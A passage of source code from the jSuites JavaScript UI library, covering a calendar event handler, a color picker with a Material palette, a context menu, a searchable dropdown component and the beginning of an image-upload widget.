          } else if (action == 'jcalendar-confirm' || action == 'jcalendar-update') {
              jSuites.calendar.current.close();
          } else if (action == 'jcalendar-close') {
              jSuites.calendar.current.close();
          } else if (action == 'jcalendar-backdrop') {
              jSuites.calendar.current.close(false, false);
          } else if (action == 'jcalendar-reset') {
              jSuites.calendar.current.reset();
          } else if (e.target.classList.contains('jcalendar-set-day')) {
              if (e.target.innerText) {
                  // Keep selected day
                  jSuites.calendar.current.update(e.target);
              }
          }

          if (action.substr(0,9) == 'jcalendar') {
              e.preventDefault();
              e.stopImmediatePropagation();
          }
      }
  }
}

/**
* Color Picker v1.0.1
* Author: paul.hodel@gmail.com
* https://github.com/paulhodel/jtools
*/

jSuites.color = (function(el, options) {
  var obj = {};
  obj.options = {};
  obj.values = [];

  // Global container
  if (! jSuites.color.current) {
      jSuites.color.current = null;
  }

  // Default configuration
  var defaults = {
      placeholder:'',
      value:null,
      onclose:null,
      onchange:null,
      position:null,
  };

  // Loop through our object
  for (var property in defaults) {
      if (options && options.hasOwnProperty(property)) {
          obj.options[property] = options[property];
      } else {
          obj.options[property] = defaults[property];
      }
  }

  var x = 0;
  var y = 0;
  var z = 0;

  var palette = {
      "red": {
          "50": "#ffebee",
          "100": "#ffcdd2",
          "200": "#ef9a9a",
          "300": "#e57373",
          "400": "#ef5350",
          "500": "#f44336",
          "600": "#e53935",
          "700": "#d32f2f",
          "800": "#c62828",
          "900": "#b71c1c",
        },
        "pink": {
          "50": "#fce4ec",
          "100": "#f8bbd0",
          "200": "#f48fb1",
          "300": "#f06292",
          "400": "#ec407a",
          "500": "#e91e63",
          "600": "#d81b60",
          "700": "#c2185b",
          "800": "#ad1457",
          "900": "#880e4f",
        },
        "purple": {
          "50": "#f3e5f5",
          "100": "#e1bee7",
          "200": "#ce93d8",
          "300": "#ba68c8",
          "400": "#ab47bc",
          "500": "#9c27b0",
          "600": "#8e24aa",
          "700": "#7b1fa2",
          "800": "#6a1b9a",
          "900": "#4a148c",
        },
        "deeppurple": {
          "50": "#ede7f6",
          "100": "#d1c4e9",
          "200": "#b39ddb",
          "300": "#9575cd",
          "400": "#7e57c2",
          "500": "#673ab7",
          "600": "#5e35b1",
          "700": "#512da8",
          "800": "#4527a0",
          "900": "#311b92",
        },
        "indigo": {
          "50": "#e8eaf6",
          "100": "#c5cae9",
          "200": "#9fa8da",
          "300": "#7986cb",
          "400": "#5c6bc0",
          "500": "#3f51b5",
          "600": "#3949ab",
          "700": "#303f9f",
          "800": "#283593",
          "900": "#1a237e",
        },
        "blue": {
          "50": "#e3f2fd",
          "100": "#bbdefb",
          "200": "#90caf9",
          "300": "#64b5f6",
          "400": "#42a5f5",
          "500": "#2196f3",
          "600": "#1e88e5",
          "700": "#1976d2",
          "800": "#1565c0",
          "900": "#0d47a1",
        },
        "lightblue": {
          "50": "#e1f5fe",
          "100": "#b3e5fc",
          "200": "#81d4fa",
          "300": "#4fc3f7",
          "400": "#29b6f6",
          "500": "#03a9f4",
          "600": "#039be5",
          "700": "#0288d1",
          "800": "#0277bd",
          "900": "#01579b",
        },
        "cyan": {
          "50": "#e0f7fa",
          "100": "#b2ebf2",
          "200": "#80deea",
          "300": "#4dd0e1",
          "400": "#26c6da",
          "500": "#00bcd4",
          "600": "#00acc1",
          "700": "#0097a7",
          "800": "#00838f",
          "900": "#006064",
        },
        "teal": {
          "50": "#e0f2f1",
          "100": "#b2dfdb",
          "200": "#80cbc4",
          "300": "#4db6ac",
          "400": "#26a69a",
          "500": "#009688",
          "600": "#00897b",
          "700": "#00796b",
          "800": "#00695c",
          "900": "#004d40",
        },
        "green": {
          "50": "#e8f5e9",
          "100": "#c8e6c9",
          "200": "#a5d6a7",
          "300": "#81c784",
          "400": "#66bb6a",
          "500": "#4caf50",
          "600": "#43a047",
          "700": "#388e3c",
          "800": "#2e7d32",
          "900": "#1b5e20",
        },
        "lightgreen": {
          "50": "#f1f8e9",
          "100": "#dcedc8",
          "200": "#c5e1a5",
          "300": "#aed581",
          "400": "#9ccc65",
          "500": "#8bc34a",
          "600": "#7cb342",
          "700": "#689f38",
          "800": "#558b2f",
          "900": "#33691e",
        },
        "lime": {
          "50": "#f9fbe7",
          "100": "#f0f4c3",
          "200": "#e6ee9c",
          "300": "#dce775",
          "400": "#d4e157",
          "500": "#cddc39",
          "600": "#c0ca33",
          "700": "#afb42b",
          "800": "#9e9d24",
          "900": "#827717",
        },
        "yellow": {
          "50": "#fffde7",
          "100": "#fff9c4",
          "200": "#fff59d",
          "300": "#fff176",
          "400": "#ffee58",
          "500": "#ffeb3b",
          "600": "#fdd835",
          "700": "#fbc02d",
          "800": "#f9a825",
          "900": "#f57f17",
        },
        "amber": {
          "50": "#fff8e1",
          "100": "#ffecb3",
          "200": "#ffe082",
          "300": "#ffd54f",
          "400": "#ffca28",
          "500": "#ffc107",
          "600": "#ffb300",
          "700": "#ffa000",
          "800": "#ff8f00",
          "900": "#ff6f00",
        },
        "orange": {
          "50": "#fff3e0",
          "100": "#ffe0b2",
          "200": "#ffcc80",
          "300": "#ffb74d",
          "400": "#ffa726",
          "500": "#ff9800",
          "600": "#fb8c00",
          "700": "#f57c00",
          "800": "#ef6c00",
          "900": "#e65100",
        },
        "deeporange": {
          "50": "#fbe9e7",
          "100": "#ffccbc",
          "200": "#ffab91",
          "300": "#ff8a65",
          "400": "#ff7043",
          "500": "#ff5722",
          "600": "#f4511e",
          "700": "#e64a19",
          "800": "#d84315",
          "900": "#bf360c",
        },
        "brown": {
          "50": "#efebe9",
          "100": "#d7ccc8",
          "200": "#bcaaa4",
          "300": "#a1887f",
          "400": "#8d6e63",
          "500": "#795548",
          "600": "#6d4c41",
          "700": "#5d4037",
          "800": "#4e342e",
          "900": "#3e2723"
        },
        "grey": {
          "50": "#fafafa",
          "100": "#f5f5f5",
          "200": "#eeeeee",
          "300": "#e0e0e0",
          "400": "#bdbdbd",
          "500": "#9e9e9e",
          "600": "#757575",
          "700": "#616161",
          "800": "#424242",
          "900": "#212121"
        },
        "bluegrey": {
          "50": "#eceff1",
          "100": "#cfd8dc",
          "200": "#b0bec5",
          "300": "#90a4ae",
          "400": "#78909c",
          "500": "#607d8b",
          "600": "#546e7a",
          "700": "#455a64",
          "800": "#37474f",
          "900": "#263238"
        }
  };

  var x = 0;
  var y = 0;
  var colors = [];

  Object.keys(palette).forEach(function(col) {
      y = 0;
      Object.keys(palette[col]).forEach(function(shade) {
          if (! colors[y]) {
              colors[y] = [];
          }
          colors[y][x] = palette[col][shade];
          y++;
      });
      x++;
  });

  // Table container
  var container = document.createElement('div');
  container.className = 'jcolor';

  // Content
  var content = document.createElement('div');
  content.className = 'jcolor-content';

  // Table pallete
  var table = document.createElement('table');
  table.setAttribute('cellpadding', '7');
  table.setAttribute('cellspacing', '0');

  for (var i = 0; i < colors.length; i++) {
      var tr = document.createElement('tr');
      for (var j = 0; j < colors[i].length; j++) {
          var td = document.createElement('td');
          td.style.backgroundColor = colors[i][j];
          td.setAttribute('data-value', colors[i][j]);
          td.innerHTML = '';
          tr.appendChild(td);

          // Selected color
          if (obj.options.value == colors[i][j]) {
              td.classList.add('jcolor-selected');
          }

          // Possible values
          obj.values[colors[i][j]] = td;
      }
      table.appendChild(tr);
  }

  /**
   * Open color pallete
   */
  obj.open = function() {
      if (jSuites.color.current) {
          if (jSuites.color.current != obj) {
              jSuites.color.current.close();
          }
      }

      if (! jSuites.color.current) {
          // Persist element
          jSuites.color.current = obj;
          // Show colorpicker
          container.classList.add('jcolor-focus');

          const rect = el.getBoundingClientRect();
          const rectContent = content.getBoundingClientRect();

          if (obj.options.position) {
              content.style.position = 'fixed';
              if (window.innerHeight < rect.bottom + rectContent.height) {
                  content.style.top = (rect.top - (rectContent.height + 2)) + 'px';
              } else {
                  content.style.top = (rect.top + rect.height + 2) + 'px';;
              }
          } else {
              if (window.innerHeight < rect.bottom + rectContent.height) {
                  content.style.top = (-1 * (rectContent.height + 2)) + 'px';
              } else {
                  content.style.top = (rect.height + 2) + 'px';
              }
          }

          container.focus();
      }
  }

  /**
   * Close color pallete
   */
  obj.close = function(ignoreEvents) {
      if (jSuites.color.current) {
          jSuites.color.current = null;
          if (! ignoreEvents && typeof(obj.options.onclose) == 'function') {
              obj.options.onclose(el);
          }
          container.classList.remove('jcolor-focus');
      }

      return obj.options.value;
  }

  /**
   * Set value
   */
  obj.setValue = function(color) {
      if (color) {
          el.value = color;
          obj.options.value = color;
      }

      // Remove current selecded mark
      var selected = container.querySelector('.jcolor-selected');
      if (selected) {
          selected.classList.remove('jcolor-selected');
      }

      // Mark cell as selected
      obj.values[color].classList.add('jcolor-selected');

      // Onchange
      if (typeof(obj.options.onchange) == 'function') {
          obj.options.onchange(el, color);
      }
  }

  /**
   * Get value
   */
  obj.getValue = function() {
      return obj.options.value;
  }

  /**
   * If element is focus open the picker
   */
  el.addEventListener("focus", function(e) {
      obj.open();
  });

  // Select color
  container.addEventListener("click", function(e) {
      if (e.target.tagName == 'TD') {
          jSuites.color.current.setValue(e.target.getAttribute('data-value'));
          jSuites.color.current.close();
      }
  });

  // Possible to focus the container
  container.setAttribute('tabindex', '900');

  if (obj.options.placeholder) {
      el.setAttribute('placeholder', obj.options.placeholder);
  }

  // Append to the table
  content.appendChild(table);
  container.appendChild(content);
  container.onblur = function(e) {
      if (jSuites.color.current) {
          jSuites.color.current.close();
      }
  }

  // Insert picker after the element
  el.parentNode.insertBefore(container, el);

  // Keep object available from the node
  el.color = obj;

  return obj;
});

jSuites.contextmenu = (function(el, options) {
  var obj = {};
  obj.options = {};

  // Default configuration
  var defaults = {
      items:null,
  };

  // Loop through our object
  for (var property in defaults) {
      if (options && options.hasOwnProperty(property)) {
          obj.options[property] = options[property];
      } else {
          obj.options[property] = defaults[property];
      }
  }

  obj.menu = document.createElement('ul');
  obj.menu.classList.add('jcontextmenu');
  obj.menu.setAttribute('tabindex', '900');

  /**
   * Open contextmenu
   */
  obj.open = function(e, items) {
      if (items) {
          obj.options.items = items;
      }

      // Reset content
      obj.menu.innerHTML = '';

      // Append items
      for (var i = 0; i < obj.options.items.length; i++) {
          if (obj.options.items[i].type && obj.options.items[i].type == 'line') {
              var itemContainer = document.createElement('hr');
          } else {
              var itemContainer = document.createElement('li');
              var itemText = document.createElement('a');
              itemText.innerHTML = obj.options.items[i].title;

              if (obj.options.items[i].disabled) {
                  itemContainer.className = 'jcontextmenu-disabled';
              } else if (obj.options.items[i].onclick) {
                  itemContainer.onmouseup = obj.options.items[i].onclick;
              }
              itemContainer.appendChild(itemText);

              if (obj.options.items[i].shortcut) {
                  var itemShortCut = document.createElement('span');
                  itemShortCut.innerHTML = obj.options.items[i].shortcut;
                  itemContainer.appendChild(itemShortCut);
              }
          }

          obj.menu.appendChild(itemContainer);
      }

      if (e.target) {
          var x = e.clientX;
          var y = e.clientY;
          obj.menu.style.top = y + 'px';
          obj.menu.style.left = x + 'px';
      } else {
          obj.menu.style.top = e.y + 'px';
          obj.menu.style.left = e.x + 'px';
      }

      obj.menu.classList.add('jcontextmenu-focus');
      obj.menu.focus();
  }

  /**
   * Close menu
   */
  obj.close = function() {
      obj.menu.classList.remove('jcontextmenu-focus');
  }

  el.addEventListener("click", function(e) {
      obj.close();
  });

  obj.menu.addEventListener('blur', function(e) {
      obj.close();
  });

  window.addEventListener("mousewheel", function() {
      obj.close();
  });

  el.appendChild(obj.menu);
  el.contextmenu = obj;

  return obj;
});

/**
* (c) 2013 jDropdown
* http://www.github.com/paulhodel/jdropdown
*
* @author: Paul Hodel <paul.hodel@gmail.com>
* @description: Custom dropdowns
*/

jSuites.dropdown = (function(el, options) {
  var obj = {};
  obj.options = {};
  obj.items = [];
  obj.groups = [];

  if (options) {
      obj.options = options;
  }

  // Global container
  if (! jSuites.dropdown.current) {
      jSuites.dropdown.current = null;
  }

  // Default configuration
  var defaults = {
      data: [],
      multiple: false,
      autocomplete: false,
      type: null,
      width: null,
      opened: false,
      onchange: null,
      onload: null,
      onopen: null,
      onclose: null,
      onblur: null,
      value: null,
      placeholder: '',
  };

  // Loop through our object
  for (var property in defaults) {
      if (options && options.hasOwnProperty(property)) {
          obj.options[property] = options[property];
      } else {
          obj.options[property] = defaults[property];
      }
  }

  // Create dropdown
  el.classList.add('jdropdown');

  if (obj.options.type == 'searchbar') {
      el.classList.add('jdropdown-searchbar');
  } else if (obj.options.type == 'list') {
      el.classList.add('jdropdown-list');
  } else if (obj.options.type == 'picker') {
      el.classList.add('jdropdown-picker');
  } else {
      if (jSuites.getWindowWidth() < 800) {
          el.classList.add('jdropdown-picker');
          obj.options.type = 'picker';
      } else {
          if (obj.options.width) {
              el.style.width = obj.options.width;
          }
          el.classList.add('jdropdown-default');
          obj.options.type = 'default';
      }
  }

  // Header container
  var containerHeader = document.createElement('div');
  containerHeader.className = 'jdropdown-container-header';

  // Header
  var header = document.createElement('input');
  header.className = 'jdropdown-header';
  if (typeof(obj.options.onblur) == 'function') {
      header.onblur = function() {
          obj.options.onblur(el);
      }
  }

  // Container
  var container = document.createElement('div');
  container.className = 'jdropdown-container';

  // Dropdown content
  var content = document.createElement('div');
  content.className = 'jdropdown-content';

  // Close button
  var closeButton  = document.createElement('div');
  closeButton.className = 'jdropdown-close';
  closeButton.innerHTML = 'Done';

  // Create backdrop
  var backdrop  = document.createElement('div');
  backdrop.className = 'jdropdown-backdrop';

  // Autocomplete
  if (obj.options.autocomplete == true) {
      el.setAttribute('data-autocomplete', true);

      // Handler
      header.addEventListener('keyup', function(e) {
          obj.find(header.value);
      });
  } else {
      header.setAttribute('readonly', 'readonly');
  }

  // Place holder
  if (obj.options.placeholder) {
      header.setAttribute('placeholder', obj.options.placeholder);
  }

  // Append elements
  containerHeader.appendChild(header);
  container.appendChild(closeButton);
  container.appendChild(content);
  el.appendChild(containerHeader);
  el.appendChild(container);
  el.appendChild(backdrop);

  obj.init = function() {
      if (obj.options.url) {
          fetch(obj.options.url, { headers: new Headers({ 'content-type': 'text/json' }) })
              .then(function(data) {
                  data.json().then(function(data) {
                      if (data) {
                          obj.options.data = data;
                          obj.setData();

                          if (typeof(obj.options.onload) == 'function') {
                              obj.options.onload(el, obj, data);
                          }
                      }
                  })
              });
      } else {
          obj.setData();

          if (typeof(obj.options.onload) == 'function') {
              obj.options.onload(el, obj, data);
          }
      }

      // Values
      obj.setValue(obj.options.value);

      if (obj.options.opened == true) {
          obj.open();
      }

      // Fix width - Workaround important to get the correct width
      if (obj.options.type == 'default') {
          setTimeout(function() {
              container.style.minWidth = header.outerWidth;
          }, 0);
      }
  }

  obj.getUrl = function() {
      return obj.options.url;
  }

  obj.setUrl = function(url) {
      obj.options.url = url;
      fetch(obj.options.url, { headers: new Headers({ 'content-type': 'text/json' }) })
          .then(function(data) {
              data.json().then(function(data) {
                  obj.setData(data);
              })
          });
  }

  obj.setData = function(data) {
      if (data) {
          obj.options.data = data;
      } else {
          var data = obj.options.data;
      }

      // Make sure the content container is blank
      content.innerHTML = '';

      // Containers
      var items = [];
      var groups = [];

      // Foreach in the data to create all items
      if (data.length) {
          data.forEach(function(v, k) {
              // Compatibility
              if (typeof(v) != 'object') {
                  var value = v;
                  v = {}
                  v.id = value;
                  v.name = value;

                  // Fix array
                  obj.options.data[k] = v;
              }

              // Create item
              items[k] = document.createElement('div');
              items[k].className = 'jdropdown-item';
              items[k].value = v.id;
              items[k].text = v.name;

              // Image
              if (v.image) {
                  var image = document.createElement('img');
                  image.className = 'jdropdown-image';
                  image.src = v.image;
                  if (! v.title) {
                     image.classList.add('jdropdown-image-small');
                  }
                  items[k].appendChild(image);
              }

              // Set content
              var node = document.createElement('div');
              node.className = 'jdropdown-description';
              node.innerHTML = v.name;
              items[k].appendChild(node);

              // Title
              if (v.title) {
                  var title = document.createElement('div');
                  title.className = 'jdropdown-title';
                  title.innerHTML = v.title;
                  node.appendChild(title);
              }

              // Append to the container
              if (v.group) {
                  if (! groups[v.group]) {
                      groups[v.group] = document.createElement('div');
                      groups[v.group].className = 'jdropdown-group-items';
                  }
                  groups[v.group].appendChild(items[k]);
              } else {
                  content.appendChild(items[k]);
              }
          });

          // Append groups in case exists
          if (Object.keys(groups).length > 0) {
              Object.keys(groups).forEach(function(v, k) {
                  var group = document.createElement('div');
                  group.className = 'jdropdown-group';
                  group.innerHTML = '<div class="jdropdown-group-name">' + v + '<i class="jdropdown-group-arrow jdropdown-group-arrow-down"></i></div>';
                  group.appendChild(groups[v]);
                  obj.groups.push(group);
                  content.appendChild(group);
              });
          }

          // Add index property
          var items = content.querySelectorAll('.jdropdown-item');
          for (var i = 0; i < items.length; i++) {
              obj.items[i] = items[i];
              items[i].setAttribute('data-index', i);
          }
      }

      // Reset value
      obj.setValue(obj.options.value ? obj.options.value : '');
  }

  obj.getText = function(asArray) {
      // Result
      var result = [];
      // Get selected items
      var items = el.querySelectorAll('.jdropdown-selected');
      // Append options
      for (var i = 0; i < items.length; i++) {
          result.push(items[i].text);
      }

      if (asArray) {
          return result
      } else {
          return result.join('; ');
      }
  }

  obj.getValue = function(asArray) {
      // Result
      var result = [];
      // Get selected items
      var items = el.querySelectorAll('.jdropdown-selected');
      // Append options
      for (var i = 0; i < items.length; i++) {
          result.push(items[i].value);
      }

      if (asArray) {
          return result;
      } else {
          return result.join(';');
      }
  }

  obj.setValue = function(value) {
      // Remove values
      var items = el.querySelectorAll('.jdropdown-selected');
      for (var j = 0; j < items.length; j++) {
          items[j].classList.remove('jdropdown-selected')
      } 

      // Set values
      if (value) {
          if (typeof(value.forEach) == 'function') {
              for (var i = 0; i < obj.items.length; i++) {
                  value.forEach(function(val) {
                      if (obj.items[i].value == val) {
                          obj.items[i].classList.add('jdropdown-selected');
                      }
                  });
              }
          } else {
              for (var i = 0; i < obj.items.length; i++) {
                  if (obj.items[i].value == value) {
                      obj.items[i].classList.add('jdropdown-selected');
                  }
              }
          }
      }

      // Update labels
      obj.updateLabel();
  }

  obj.selectIndex = function(index) {
      // Focus behaviour
      if (! obj.options.multiple) {
          // Update selected item
          obj.items.forEach(function(v) {
              v.classList.remove('jdropdown-cursor');
              v.classList.remove('jdropdown-selected');
          });
          obj.items[index].classList.add('jdropdown-selected');
          obj.items[index].classList.add('jdropdown-cursor');
          // Close
          obj.close();
      } else {
          // Toggle option
          if (obj.items[index].classList.contains('jdropdown-selected')) {
              obj.items[index].classList.remove('jdropdown-selected');
              obj.items[index].classList.remove('jdropdown-cursor');
          } else {
              obj.items.forEach(function(v) {
                  v.classList.remove('jdropdown-cursor');
              });
              obj.items[index].classList.add('jdropdown-selected');
              obj.items[index].classList.add('jdropdown-cursor');
          }
          // Update cursor position
          obj.currentIndex = index;

          // Update labels for multiple dropdown
          if (! obj.options.autocomplete) {
              obj.updateLabel();
          }
      }

      // Events
      if (typeof(obj.options.onchange) == 'function') {
          var oldValue = obj.getValue();
          var newValue = obj.items[index].value;

          obj.options.onchange(el, index, oldValue, newValue);
      }
  }

  obj.selectItem = function(item) {
      var index = item.getAttribute('data-index');
      if (jSuites.dropdown.current) {
          obj.selectIndex(item.getAttribute('data-index'));
      } else {
          // List
          if (obj.options.type == 'list') {
              if (! obj.options.multiple) {
                  obj.items.forEach(function(k, v) {
                      v.classList.remove('jdropdown-cursor');
                      v.classList.remove('jdropdown-selected');
                  });
                  obj.items[index].classList.add('jdropdown-selected');
                  obj.items[index].classList.add('jdropdown-cursor');
              } else {
                  // Toggle option
                  if (obj.items[index].classList.contains('jdropdown-selected')) {
                      obj.items[index].classList.remove('jdropdown-selected');
                      obj.items[index].classList.remove('jdropdown-cursor');
                  } else {
                      obj.items.forEach(function(v) {
                          v.classList.remove('jdropdown-cursor');
                      });
                      obj.items[index].classList.add('jdropdown-selected');
                      obj.items[index].classList.add('jdropdown-cursor');
                  }
                  // Update cursor position
                  obj.currentIndex = index;
              }
          }
      }
  }

  obj.find = function(str) {
      // Append options
      for (var i = 0; i < obj.items.length; i++) {
          if (str == null || obj.items[i].classList.contains('jdropdown-selected') || obj.items[i].innerHTML.toLowerCase().indexOf(str.toLowerCase()) != -1) {
              obj.items[i].style.display = '';
          } else {
              obj.items[i].style.display = 'none';
          }
      };

      var numVisibleItems = function(items) {
          var visible = 0;
          for (var j = 0; j < items.length; j++) {
              if (items[j].style.display != 'none') {
                  visible++;
              }
          }
          return visible;
      }

      // Hide groups
      for (var i = 0; i < obj.groups.length; i++) {
          if (numVisibleItems(obj.groups[i].querySelectorAll('.jdropdown-item'))) {
              obj.groups[i].children[0].style.display = '';
          } else {
              obj.groups[i].children[0].style.display = 'none';
          }
      }
  }

  obj.updateLabel = function() {
      // Update label
      header.value = obj.getText();
  }

  obj.open = function() {
      if (jSuites.dropdown.current != el) {
          if (jSuites.dropdown.current) {
              jSuites.dropdown.current.dropdown.close();
          }
          jSuites.dropdown.current = el;
      }

      // Focus
      if (! el.classList.contains('jdropdown-focus')) {
          // Add focus
          el.classList.add('jdropdown-focus');

          // Animation
          if (jSuites.getWindowWidth() < 800) {
              if (obj.options.type == null || obj.options.type == 'picker') {
                  container.classList.add('slide-bottom-in');
              }
          }

          // Filter
          if (obj.options.autocomplete == true) {
              // Redo search
              obj.find();
              // Clear search field
              header.value = '';
              header.focus();
          }

          // Selected
          var selected = el.querySelector('.jdropdown-selected');
          // Update cursor position
          if (selected) {
              obj.updateCursor(selected.getAttribute('data-index'));
          }
          // Container Size
          if (! obj.options.type || obj.options.type == 'default') {
              const rect = el.getBoundingClientRect();
              const rectContainer = container.getBoundingClientRect();
              container.style.minWidth = rect.width + 'px';
              //container.style.maxWidth = '100%';

              if (obj.options.position) {
                  container.style.position = 'fixed';
                  if (window.innerHeight < rect.bottom + rectContainer.height) {
                      container.style.top = (rect.top - rectContainer.height - 2) + 'px';
                  } else {
                      container.style.top = (rect.top + rect.height + 1) + 'px';
                  }
              } else {
                  if (window.innerHeight < rect.bottom + rectContainer.height) {
                      container.style.top = (-1 * (rectContainer.height)) + 'px';
                  } else {
                      container.style.top = '';
                  }
              }
          }
      }

      // Events
      if (typeof(obj.options.onopen) == 'function') {
          obj.options.onopen(el);
      }
  }

  obj.close = function(ignoreEvents) {
      if (jSuites.dropdown.current) {
          // Remove controller
          jSuites.dropdown.current = null
          // Remove cursor
          var cursor = el.querySelector('.jdropdown-cursor');
          if (cursor) {
              cursor.classList.remove('jdropdown-cursor');
          }
          // Update labels
          obj.updateLabel();
          // Events
          if (! ignoreEvents && typeof(obj.options.onclose) == 'function') {
              obj.options.onclose(el);
          }
          // Reset
          obj.currentIndex = null;
          // Blur
          header.blur();
          // Remove focus
          el.classList.remove('jdropdown-focus');
      }

      return obj.getValue();
  }

  obj.reset = function() {
      // Remove current cursor
      var cursor = el.querySelector('.jdropdown-cursor');
      if (cursor) {
          cursor.classList.remove('jdropdown-cursor');
      }
      // Unselected all
      obj.items.forEach(function(v) {
          v.classList.remove('jdropdown-selected');
      });
      // Update labels
      obj.updateLabel();
  }

  obj.first = function() {
      var newIndex = null;
      for (var i = obj.currentIndex - 1; i >= 0; i--) {
          if (obj.items[i].style.display != 'none') {
              newIndex = i;
          }
      }

      if (newIndex == null) {
          return false;
      }

      obj.updateCursor(newIndex);
  }

  obj.last = function() {
      var newIndex = null;
      for (var i = obj.currentIndex + 1; i < obj.options.data.length; i++) {
          if (obj.items[i].style.display != 'none') {
              newIndex = i;
          }
      }

      if (newIndex == null) {
          return false;
      }

      obj.updateCursor(newIndex);
  }

  obj.next = function() {
      var newIndex = null;
      for (var i = obj.currentIndex + 1; i < obj.options.data.length; i++) {
          if (obj.items[i].style.display != 'none') {
              newIndex = i;
              break;
          }
      }

      if (newIndex == null) {
          return false;
      }

      obj.updateCursor(newIndex);
  }

  obj.prev = function() {
      var newIndex = null;
      for (var i = obj.currentIndex - 1; i >= 0; i--) {
          if (obj.items[i].style.display != 'none') {
              newIndex = i;
              break;
          }
      }

      if (newIndex == null) {
          return false;
      }

      obj.updateCursor(newIndex);
  }

  obj.updateCursor = function(index) {
      // Update cursor
      if (obj.items[obj.currentIndex]) {
          obj.items[obj.currentIndex].classList.remove('jdropdown-cursor');
      }
      if (obj.items && obj.items[index]) {
          obj.items[index].classList.add('jdropdown-cursor');

          // Update position
          obj.currentIndex = parseInt(index);
  
          // Update scroll
          var container = content.scrollTop;
          var element = obj.items[obj.currentIndex];
          content.scrollTop = element.offsetTop - element.scrollTop + element.clientTop - 95;
      }
  }

  if (! jSuites.dropdown.hasEvents) {
      document.addEventListener('click', jSuites.dropdown.onclick);
      document.addEventListener('keydown', jSuites.dropdown.onkeydown);

      jSuites.dropdown.hasEvents = true;
  }

  // Start dropdown
  obj.init();

  // Keep object available from the node
  el.dropdown = obj;

  return obj;
});

jSuites.dropdown.onclick = function(e) {
  var element = jSuites.getElement(e.target, 'jdropdown');
  if (element) {
      var dropdown = element.dropdown;
      if (e.target.classList.contains('jdropdown-header')) {
          if (element.classList.contains('jdropdown-focus') && element.classList.contains('jdropdown-default')) {
              dropdown.close();
          } else {
              dropdown.open();
          }
      } else if (e.target.classList.contains('jdropdown-group-name')) {
          var items = e.target.nextSibling.children;
          if (e.target.nextSibling.style.display != 'none') {
              for (var i = 0; i < items.length; i++) {
                  if (items[i].style.display != 'none') {
                      dropdown.selectItem(items[i]);
                  }
              }
          }
      } else if (e.target.classList.contains('jdropdown-group-arrow')) {
          if (e.target.classList.contains('jdropdown-group-arrow-down')) {
              e.target.classList.remove('jdropdown-group-arrow-down');
              e.target.classList.add('jdropdown-group-arrow-up');
              e.target.parentNode.nextSibling.style.display = 'none';
          } else {
              e.target.classList.remove('jdropdown-group-arrow-up');
              e.target.classList.add('jdropdown-group-arrow-down');
              e.target.parentNode.nextSibling.style.display = '';
          }
      } else if (e.target.classList.contains('jdropdown-item')) {
          dropdown.selectItem(e.target);
      } else if (e.target.classList.contains('jdropdown-image')) {
          dropdown.selectIndex(e.target.parentNode.getAttribute('data-index'));
      } else if (e.target.classList.contains('jdropdown-description')) {
          dropdown.selectIndex(e.target.parentNode.getAttribute('data-index'));
      } else if (e.target.classList.contains('jdropdown-title')) {
          dropdown.selectIndex(e.target.parentNode.parentNode.getAttribute('data-index'));
      } else if (e.target.classList.contains('jdropdown-close') || e.target.classList.contains('jdropdown-backdrop')) {
          // Close
          dropdown.close();
      }

      e.stopPropagation();
      e.preventDefault();
  } else {
      if (jSuites.dropdown.current) {
          jSuites.dropdown.current.dropdown.close();
      }
  }
}


// Keydown controls
jSuites.dropdown.onkeydown = function(e) {
  if (jSuites.dropdown.current) {
      // Element
      var element = jSuites.dropdown.current.dropdown;
      // Index
      var index = element.currentIndex;

      if (e.shiftKey) {

      } else {
          if (e.which == 13 || e.which == 35 || e.which == 36 || e.which == 38 || e.which == 40) {
              // Move cursor
              if (e.which == 13) {
                  element.selectIndex(index)
              } else if (e.which == 38) {
                  if (index == null) {
                      element.updateCursor(0);
                  } else if (index > 0) {
                      element.prev();
                  }
              } else if (e.which == 40) {
                  if (index == null) {
                      element.updateCursor(0);
                  } else if (index + 1 < element.options.data.length) {
                      element.next();
                  }
              } else if (e.which == 36) {
                  element.first();
              } else if (e.which == 35) {
                  element.last();
              }

              e.stopPropagation();
              e.preventDefault();
          }
      }
  }
}

jSuites.image = (function(el, options) {
  var obj = {};
  obj.options = {};

  // Default configuration
  var defaults = {
      minWidth:false,
      onchange:null,
      singleFile:true,
      parser:'',
      text:{
          extensionNotAllowed:'The extension is not allowed',
          imageTooSmall:'The resolution is too low, try a image with a better resolution. width > 800px',
      }
  };

  // Loop through our object
  for (var property in defaults) {
      if (options && options.hasOwnProperty(property)) {
          obj.options[property] = options[property];
      } else {
          obj.options[property] = defaults[property];
      }
  }

  // Upload icon
  el.classList.add('jupload');

  // Add image
  obj.addImage = function(file) {
      var img = document.createElement('img');
      img.setAttribute('data-lastmodified', file.lastmodified);
      img.setAttribute('data-name', file.name);
      img.setAttribute('data-size', file.size);
      img.setAttribute('data-thumbs', file.thumbs);
      img.setAttribute('data-cover', file.cover ? 1 : 0);
      img.setAttribute('src', file.file);
      img.className = 'jfile';
      img.style.width = '100%';

      return img;
  }

  // Add image
  obj.addImages = function(files) {
      if (obj.options.singleFile == true) {
          el.innerHTML = '';
      }

      for (var i = 0; i < files.length; i++) {
          el.appendChild(obj.addImage(files[i]));
      }
  }

  obj.addFromFile = function(file) {
      if (obj.options.singleFile == true) {
          el.innerHTML = '';
      }

      var type = file.type.split('/');
      if (type[0] == 'image') {
          var image = new FileReader();
          image.addEventListener("load", function (v) {

              var img = document.createElement('img');
              img.setAttribute('data-lastmodified', file.lastModified);
              img.setAttribute('data-name', file.name);
              img.setAttribute('data-size', file.size);
              img.setAttribute('src', v.srcElement.result);
              el.appendChild(img);

              setTimeout(function() {
                  if (obj.options.minWidth && (parseInt(img.width) < parseInt(obj.options.minWidth))) {
                      img.remove();
                      alert(obj.options.text.imageTooSmall);
                  } else {
                      if (typeof(obj.options.onchange) == 'function') {
                          obj.options.onchange(img);
                      }
                  }
              }, 0);
          }, false);

          image.readAsDataURL(file);
      } else {
          alert(text.extentionNotAllowed);
      }
  }

  var attachmentInput = document.createElement('input');
  attachmentInput.type = 'file';
  attachmentInput.setAttribute('accept', 'image/*');
  attachmentInput.onchange = function() {
      for (var i = 0; i < this.files.length; i++) {
          obj.addFromFile(this.files[i]);
      }
  }

  el.addEventListener("dblclick", function(e) {
      var evt = new MouseEvent('click', {
          bubbles: true,
          cancelable: true,
          view: window
      });

      attachmentInput.dispatchEvent(evt);
  });

  el.addEventListener('dragenter', function(e) {
      el.style.border = '1px dashed #000';
  });

  el.addEventListener('dragleave', function(e) {
      el.style.border = '1px solid #eee';
  });

  el.addEventListener('dragstop', function(e) {
      el.style.border = '1px solid #eee';
  });

